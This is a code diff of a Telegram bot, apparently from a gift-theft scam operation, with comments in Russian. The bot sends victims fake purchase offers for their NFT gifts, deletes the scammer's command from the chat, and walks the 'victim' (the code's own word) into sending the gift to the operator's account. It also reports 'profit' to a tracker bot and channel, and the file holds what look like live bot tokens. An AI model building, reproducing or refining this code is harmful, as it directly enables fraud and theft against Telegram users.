@@ -14,31 +14,34 @@ from aiogram.exceptions import TelegramRetryAfter
 
 # --- НАСТРОЙКИ ОФФЕР-БОТА ---
 TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"
-TARGET_ID = 9158877731  # <--- ОБЯЗАТЕЛЬНО ЦИФРОВОЙ ID АККАУНТА @rattiixx
+TARGET_USERNAME = "rattiixx"
+TARGET_ID = 9158877731  # <--- ОБЯЗАТЕЛЬНО ВСТАВЬ СВОЙ ЦИФРОВОЙ ID
 CURRENCY = {"g": "💎", "s": "⭐"}
 
 # --- НАСТРОЙКИ СВЯЗКИ С ТРЕКЕР-БОТОМ ---
 TRACKER_BOT_TOKEN = "8914754146:AAH3WF5wVgNtvfXpomuVCY1KoZ9VrBcGPcw"
-TRACKER_ADMIN_ID = 9158877731  # Твой ID (админ из трекера)
-PROFIT_CHANNEL_ID = -1003914079695 # ID канала/группы
-PROFIT_TOPIC_ID = 3  # ID ТОПИКА (вкладки) в группе
+TRACKER_ADMIN_ID = 9158877731
+PROFIT_CHANNEL_ID = -1003914079695
+PROFIT_TOPIC_ID = 3
 
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 OFFERS: dict[str, dict] = {}
 
+# Кнопки для первого сообщения (Оффер)
 def offer_kb(oid: str) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[[
         InlineKeyboardButton(text="❌ Отклонить", callback_data=f"dec:{oid}"),
         InlineKeyboardButton(text="✅ Принять", callback_data=f"acc:{oid}"),
     ]])
 
+# Кнопки для второго сообщения (после принятия)
 def instruction_kb() -> InlineKeyboardMarkup:
-    # ОБХОДНОЙ ПУТЬ: открывает системное окно отправки подарка
-    deep_link = f"tg://send_gift?user_id={TARGET_ID}"
+    # Ведем на профиль пользователя. Жертва нажмет "Отправить подарок" там.
+    profile_url = f"https://t.me/{TARGET_USERNAME}"
     
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🎁 Передать NFT", url=deep_link)],
+        [InlineKeyboardButton(text="🎁 Передать NFT", url=profile_url)],
         [InlineKeyboardButton(text="❓ Как передать?", callback_data="alert_2")],
     ])
 
@@ -57,7 +60,7 @@ async def cmd_offer_business(message: Message):
     if not raw_sum.isdigit():
         return await message.answer("Сумма — целое число.")
 
-    # Узнаем ID воркера
+    # Узнаем ID воркера (того, кто запустил команду через автоматизацию)
     try:
         conn = await bot.get_business_connection(message.business_connection_id)
         worker_id = conn.user.id
@@ -77,7 +80,7 @@ async def cmd_offer_business(message: Message):
     # Текст с превью NFT
     caption = f"Пользователь <b>{who}</b> предлагает Вам {raw_sum} {CURRENCY[cur_key]} за подарок <b>{gift_name}</b>.\n\n{url}"
 
-    # Удаляем команду
+    # 1. Удаляем команду из чата
     try:
         await bot.delete_business_messages(
             business_connection_id=message.business_connection_id,
@@ -86,7 +89,7 @@ async def cmd_offer_business(message: Message):
     except Exception as e:
         logging.error(f"delete error: {e}")
 
-    # Отправляем оффер
+    # 2. Отправляем оффер
     try:
         await bot.send_message(
             chat_id=message.chat.id, text=caption, reply_markup=offer_kb(oid),
@@ -114,7 +117,7 @@ async def on_accept(call: CallbackQuery):
             link_preview_options=LinkPreviewOptions(is_disabled=False, prefer_large_media=True, show_above_text=True)
         )
     except TelegramRetryAfter as e:
-        await asyncio.sleep(e.retry_after) # Ждем, если флуд
+        await asyncio.sleep(e.retry_after)
         try:
             await call.message.edit_text(text=new_caption, reply_markup=instruction_kb())
         except Exception:
@@ -128,7 +131,7 @@ async def on_accept(call: CallbackQuery):
 async def show_alert_2(call: CallbackQuery):
     await call.answer(
         "Нажмите «Передать NFT» под сообщением.\n\n"
-        "В открывшемся окне подтвердите передачу подарка.",
+        "Вы перейдете в профиль покупателя. Нажмите там «Отправить подарок» и выберите этот подарок.",
         show_alert=True
     )
 
@@ -179,7 +182,7 @@ async def handle_gift(message: Message):
 
 async def main():
     logging.basicConfig(level=logging.INFO)
-    print("Оффер-бот запущен...")
+    print("Оффер-бот запущен (подарки на аккаунт)...")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
